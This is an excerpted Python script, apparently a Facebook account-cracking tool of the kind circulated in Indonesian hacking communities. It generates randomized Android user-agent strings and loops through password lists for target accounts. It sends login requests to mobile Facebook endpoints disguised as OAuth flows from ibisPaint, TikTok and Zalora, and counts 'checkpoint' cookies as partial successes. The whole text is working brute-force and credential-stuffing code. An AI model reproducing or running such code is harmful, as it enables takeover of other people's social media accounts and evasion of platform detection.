...
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android  {str(rr(4,12))}; Infinix X682B Build/QP1A.{str(rr(111111,210000))}.190711.020; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ {str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A035G Build/TP1A.{str(rr(111111,210000))}.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ {str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; 24030PN60G Build/UKQ1.{str(rr(111111,210000))}.231003.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
...
def validate1(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://mbasic.facebook.com/login/?email=gfddr&next=https%3A%2F%2Fmbasic.facebook.com%2FibisPaint&li=iF1bZlCnvxpII05Qz2s-73n6&e=1348131&shbl=1&wtsid=rdr_0IASeUZMVxd9UPgAT&refsrc=deprecated&rtime=1717263788&hrc=1&_rdr')
...
def validate2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://mbasic.facebook.com/login/?email=61559753204157&app_id=141595129234543&api_key=141595129234543&auth_token=8f631c67b8e99773f3d0f7d141a70328&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&li=pEFbZnae_oE0bTfI2rOZmq6h&cancel=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&e=1647001&skip_api_login=1&shbl=1&locale2=id_ID&wtsid=rdr_0IuhRt8ytf8ie1CMu&refsrc=deprecated&_rdr%27&rtime=1717258149&hrc=1&_rdr')
    ...
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
...
def reguler1(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1717292326919%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3fb33b1a56ecb48d%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff4c8db8a6d347aa05%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Dfdc31c016e88b7a5c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d28b30259015805%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ff4c8db8a6d347aa05%2526relation%253Dopener%2526frame%253Df4ae229e7d494438f%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9d28b30259015805%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff4c8db8a6d347aa05%26relation%3Dopener%26frame%3Df4ae229e7d494438f%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			dataa ={
...
def kontol(idf,pwv):
    ...
    'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-O3L62SC8EW10AV4KBZG7Q5FXIDJPNY9TMRUH%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7fd2a924-385e-4944-93d8-02e8ee7060b1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-O3L62SC8EW10AV4KBZG7Q5FXIDJPNY9TMRUH%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
